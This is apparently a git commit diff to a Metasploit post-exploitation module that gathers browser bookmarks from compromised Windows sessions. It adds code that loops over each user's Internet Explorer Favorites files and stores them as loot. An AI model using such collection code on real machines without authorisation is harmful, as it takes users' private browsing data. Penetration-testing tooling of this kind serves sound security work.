f5df9b500d23522370c213055a3514670d44a196
jerrelgordon <73038486+jerrelgordon@users.noreply.github.com>
2022-05-10 18:13:22 -0400

    Update to include Internet Explorer

--- modules/post/windows/gather/get_bookmarks.rb
+++ modules/post/windows/gather/get_bookmarks.rb
@@ -26,6 +26,7 @@ class MetasploitModule < Msf::Post
     get_bookmarks('GoogleChrome') # gets bookmarks for google chrome
     get_bookmarks('Opera') # gets bookmarks for opera
     get_bookmarks('Edge') # gets bookmarks for edge
+    get_bookmarks('IE') # gets bookmarks for internet explorer
   end
 
   def get_bookmarks(browser)
@@ -44,7 +45,29 @@ class MetasploitModule < Msf::Post
         next unless user['AppData']
 
         bookmark_path = "#{user['AppData']}\\Opera Software\\Opera Stable\\Bookmarks" # sets path for Opera Bookmarks
+      elsif (browser == 'IE')
+        next unless user['Favorites']
+
+        bookmark_path = (user['Favorites']).to_s # sets path for IE Bookmarks Folder
+        count = 1
+        dir(bookmark_path).each do |file| # IE bookmarks stored individually as files so loots each one
+          file_exists = true
+          print_status("BOOKMARKS FOR #{user['ProfileDir']}")
+          path2 = "#{bookmark_path}\\#{file}"
+          file_contents = read_file(path2)
+          stored_bookmarks = store_loot(
+            "#{browser}.bookmarks",
+            'text/plain',
+            session,
+            file_contents,
+            "#{session}_#{count}_#{browser}_bookmarks.txt",
+            "Bookmarks for #{browser}"
+          )
+          print_status("Bookmarks stored: #{stored_bookmarks}")
+          count += 1
+        end
       end
+
       next unless file?(bookmark_path) # if file exists it is set to found, then all the bookmarks are outputted to standard output (the shell)
 
       file_exists = true
